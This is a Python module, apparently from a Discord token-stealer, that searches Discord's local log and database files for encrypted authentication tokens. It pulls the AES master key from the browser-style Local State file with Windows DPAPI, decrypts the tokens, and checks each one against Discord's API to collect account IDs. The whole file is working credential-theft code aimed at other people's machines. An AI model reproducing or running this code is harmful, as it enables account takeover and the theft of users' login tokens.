import os
from constants import path
import re
import base64
import json
import requests

from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES

__base_url = "https://discord.com/api/v9/users/@me"
__regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
__regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

# Example return: // uds and tokens = [[], []]
def get_discord_tokens():
    tokens = []
    uids = []

    for cur_path in path.Paths["general"]["discord"].values():
      for root, dirs, files in os.walk(cur_path):
          for file in files:
              if file[-3:] not in ["log", "ldb"]:
                  continue
              for line in [x.strip() for x in open(os.path.join(root, file), errors="ignore").readlines() if x.strip()]:
                  for y in re.findall(__regexp_enc, line):
                    newPath = root.split("\\")
                    token = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
                                                      1]), get_master_key("\\".join(newPath[:-3]) + "\\Local State"))

                    if validate_token(token):
                        uid = requests.get(__base_url, headers={
                                            'Authorization': token}).json()['id']
                        if uid not in uids:
                            tokens.append(token)
                            uids.append(uid)

    return tokens, uids

def validate_token(token: str) -> bool:
    r = requests.get(__base_url, headers={'Authorization': token})

    if r.status_code == 200:
        return True

    return False

def decrypt_val(buff: bytes, master_key: bytes) -> str:
    if master_key is None:
        return

    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass

def get_master_key(path: str) -> str:
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path, 'r', encoding='utf-8', errors='ignore').read():
        return

    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

    return master_key
